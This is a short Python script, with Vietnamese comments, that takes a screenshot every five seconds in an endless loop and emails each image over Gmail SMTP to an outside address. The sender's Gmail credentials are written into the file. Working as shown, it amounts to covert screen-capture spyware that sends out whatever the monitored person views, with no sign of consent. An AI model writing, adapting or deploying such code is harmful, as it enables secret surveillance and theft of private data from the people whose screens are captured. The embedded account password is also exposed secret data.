import pyautogui
import time
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from io import BytesIO

sender_email = "huy8bit@gmail.com"
sender_password = "tvyd ppnk lxhg saka"
receiver_email = "webchat6969@gmail.com"


def send_email(sender_email, sender_password, receiver_email, subject, screenshot):
    # Create a multipart message
    msg = MIMEMultipart()
    msg["From"] = sender_email
    msg["To"] = receiver_email
    msg["Subject"] = subject

    # Add body to email
    msg.attach(MIMEText("Screenshot attached.", "plain"))

    # Save the screenshot to a BytesIO object
    screenshot_bytes = BytesIO()
    screenshot.save(screenshot_bytes, format="PNG")
    screenshot_bytes.seek(0)

    # Add image to email as MIMEBase
    part = MIMEBase("application", "octet-stream")
    part.set_payload(screenshot_bytes.read())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", 'attachment; filename="screenshot.png"')
    msg.attach(part)

    # Create SMTP session
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.starttls()
        server.login(sender_email, sender_password)
        server.send_message(msg)
        print("Email sent.")


while True:
    # Chụp màn hình
    screenshot = pyautogui.screenshot()

    # Gửi email
    send_email(sender_email, sender_password, receiver_email, "Screenshot", screenshot)

    # Đợi 5 giây trước khi chụp màn hình tiếp theo
    time.sleep(5)
